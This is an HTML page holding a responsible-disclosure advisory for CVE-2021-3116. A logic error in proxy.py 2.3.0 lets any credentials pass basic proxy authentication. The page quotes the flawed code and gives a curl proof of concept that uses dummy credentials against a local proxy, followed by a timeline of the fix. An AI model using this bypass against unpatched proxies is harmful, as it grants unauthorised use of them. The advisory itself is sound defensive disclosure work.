@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+
+        <title>[CVE-2021-3116] proxy.py 2.3.0 — Broken basic authentication</title>
+
+        
+        <meta name="description" content="A logic bug enables a trivial bypass of the basic authentication mechanism of the proxy.">
+        
+
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:site" content="@cyrus_and">
+        <meta property="og:url" content="https://cardaci.xyz/advisories/2021/01/10/proxy.py-2.3.0-broken-basic-authentication/">
+        <meta property="og:title" content="[CVE-2021-3116] proxy.py 2.3.0 — Broken basic authentication">
+        <meta property="og:image" content="https://cardaci.xyz/assets/img/icon.png">
+        
+        <meta property="og:description" content="A logic bug enables a trivial bypass of the basic authentication mechanism of the proxy.">
+        
+
+        <link type="application/atom+xml" rel="alternate" href="https://cardaci.xyz/feed.xml" title="Andrea Cardaci" />
+
+        <link rel="icon" href="/assets/img/icon.png">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+        <meta name="theme-color" content="#000000">
+
+        
+
+        <link rel="stylesheet" href="/assets/css/post.css" type="text/css" media="screen"/>
+        <link rel="stylesheet" href="/assets/css/print.css" type="text/css" media="print"/>
+    </head>
+    <body>
+        <div id="header">
+    <a href="/">Home</a>
+    #
+    
+
+
+<a href="/advisories/2021/01/10/proxy.py-2.3.0-broken-basic-authentication/">Permalink</a>
+<a title="Share on Twitter" href="https://twitter.com/intent/tweet?text=%5BCVE-2021-3116%5D+proxy.py+2.3.0+%E2%80%94+Broken+basic+authentication%0A%0Ahttps%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2021%2F01%2F10%2Fproxy.py-2.3.0-broken-basic-authentication%2F">Twitter</a>
+<a title="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2021%2F01%2F10%2Fproxy.py-2.3.0-broken-basic-authentication%2F">Facebook</a>
+<a title="Share on LinkedIn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2021%2F01%2F10%2Fproxy.py-2.3.0-broken-basic-authentication%2F&title=%5BCVE-2021-3116%5D+proxy.py+2.3.0+%E2%80%94+Broken+basic+authentication">LinkedIn</a>
+
+</div>
+
+<div id="container">
+    <h1>[CVE-2021-3116] proxy.py 2.3.0 — Broken basic authentication</h1>
+    <p id="post-info">Andrea Cardaci — 10 January 2021</p>
+    
+    
+    <table id="advisory-header">
+  <thead>
+    <tr>
+      <th style="text-align: right"> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: right"><strong>Discovered</strong></td>
+      <td>2021-01-09</td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Author</strong></td>
+      <td><a href="mailto:cyrus.and@gmail.com">Andrea Cardaci</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Product</strong></td>
+      <td><a href="https://github.com/abhinavsingh/proxy.py">proxy.py</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Tested versions</strong></td>
+      <td>2.3.0</td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>CVE</strong></td>
+      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3116">CVE-2021-3116</a></td>
+    </tr>
+  </tbody>
+</table>
+
+    
+    <h2 id="abstract">Abstract</h2>
+
+<p><a href="https://github.com/abhinavsingh/proxy.py">proxy.py</a> is a feature-rich HTTP proxy server written in Python. Among the other things it allows to spawn a proxy server that enforces <a href="https://en.wikipedia.org/wiki/Basic_access_authentication">HTTP basic access authentication</a>.</p>
+
+<p>A recent <a href="https://github.com/abhinavsingh/proxy.py/commit/a48319e32d3c60cb919ef70706b3a3750406f837">refactoring</a> introduced a logic bug that allows to bypass the proxy authentication.</p>
+
+<h2 id="details">Details</h2>
+
+<p>The vulnerable code is located in <a href="https://github.com/abhinavsingh/proxy.py/blob/f04845cd645e642b92a40ea5650fd805f4f9ad04/proxy/http/proxy/auth.py#L31-L41">proxy/http/proxy/auth.py</a>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">before_upstream_connection</span><span class="p">(</span>
+        <span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">:</span> <span class="n">HttpParser</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="n">HttpParser</span><span class="p">]:</span>
+    <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">flags</span><span class="p">.</span><span class="n">auth_code</span><span class="p">:</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s">'proxy-authorization'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="n">ProxyAuthenticationFailed</span><span class="p">()</span>
+        <span class="n">parts</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sa">b</span><span class="s">'proxy-authorization'</span><span class="p">][</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">()</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span> \
+                <span class="ow">and</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="sa">b</span><span class="s">'basic'</span> \
+                <span class="ow">and</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">self</span><span class="p">.</span><span class="n">flags</span><span class="p">.</span><span class="n">auth_code</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="n">ProxyAuthenticationFailed</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">request</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">and</code> operators are wrong here, and it is enough to set one of its operands to <code class="language-plaintext highlighter-rouge">False</code> to skip the challenge and bypass the authentication. A valid <code class="language-plaintext highlighter-rouge">Proxy-Authorization</code> header (e.g., for <code class="language-plaintext highlighter-rouge">user:password</code>) is in the form:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Proxy-Authorization: Basic dXNlcjpwYXNzd29yZA==
+</code></pre></div></div>
+
+<p>So <code class="language-plaintext highlighter-rouge">len(parts)</code> is <code class="language-plaintext highlighter-rouge">2</code>, thus any valid header with any credentials works.</p>
+
+<h2 id="proof-of-concept">Proof of concept</h2>
+
+<p>Start <code class="language-plaintext highlighter-rouge">proxy.py</code> like:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>proxy <span class="nt">--basic-auth</span> user:password
+<span class="go">2021-01-10 19:25:31,183 - pid:73304 [I] load_plugins:334 - Loaded plugin proxy.http.proxy.AuthPlugin
+2021-01-10 19:25:31,184 - pid:73304 [I] load_plugins:334 - Loaded plugin proxy.http.proxy.HttpProxyPlugin
+2021-01-10 19:25:31,184 - pid:73304 [I] listen:113 - Listening on ::1:8899
+2021-01-10 19:25:31,215 - pid:73304 [I] start_workers:136 - Started 8 workers
+</span></code></pre></div></div>
+
+<p>Trying to use the proxy without credentials correctly yields a proxy authentication error:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="nt">-x</span> localhost:8899 http://example.com
+<span class="go">HTTP/1.1 407 Proxy Authentication Required
+Proxy-agent: proxy.py v2.3.0
+Proxy-Authenticate: Basic
+Connection: close
+Content-Length: 29
+</span></code></pre></div></div>
+
+<p>But specifying any credentials (e.g., <code class="language-plaintext highlighter-rouge">x:x</code>) allows the request to go through:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="nt">-x</span> x:x@localhost:8899 http://example.com
+<span class="go">HTTP/1.1 200 OK
+Content-Encoding: gzip
+Accept-Ranges: bytes
+Age: 276321
+Cache-Control: max-age=604800
+</span><span class="gp">Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+<span class="go">Date: Sun, 10 Jan 2021 18:31:28 GMT
+Etag: "3147526947"
+Expires: Sun, 17 Jan 2021 18:31:28 GMT
+Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT
+Server: ECS (bsa/EB23)
+X-Cache: HIT
+Content-Length: 648
+</span></code></pre></div></div>
+
+<h2 id="timeline">Timeline</h2>
+
+<dl>
+  <dt>2021-01-09</dt>
+  <dd>Disclosed privately to the developers as suggested in their <a href="https://github.com/abhinavsingh/proxy.py/blob/develop/SECURITY.md">SECURITY.md</a>.</dd>
+  <dt>2021-01-10</dt>
+  <dd>The developers implement the <a href="https://github.com/abhinavsingh/proxy.py/pull/482/commits/9b00093288237f5073c403f2c4f62acfdfa8ed46">fix</a> and release version 2.3.1</dd>
+  <dt>2021-01-11</dt>
+  <dd>MITRE assigns <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3116">CVE-2021-3116</a> to this vulnerability.</dd>
+</dl>
+
+
+</div>
+
+<script>
+ // add permalink on headings
+ document.querySelectorAll('h2, h3, h4, h5, h5').forEach((heading) => {
+     const link = document.createElement('a');
+     link.className = 'permalink';
+     link.href = `#${heading.id}`;
+     heading.appendChild(link);
+ });
+
+ // add download links (add the following after the block {: download="filename.ext"})
+ document.querySelectorAll('div[download]').forEach((node) => {
+     const name = node.getAttribute('download');
+     const blob = new Blob([node.innerText]);
+     const span = document.createElement('span');
+     span.className = 'download-label';
+     span.appendChild(document.createTextNode(name));
+     node.prepend(span);
+     const a = document.createElement('a');
+     a.setAttribute('href', URL.createObjectURL(blob));
+     a.setAttribute('download', name);
+     a.appendChild(document.createTextNode(name));
+     node.prepend(a);
+ });
+</script>
+
+        <div id="footer">
+            Andrea Cardaci &copy; 2021. All rights reserved (unless explicitly stated otherwise).
+
+        </div>
+    </body>
+</html>
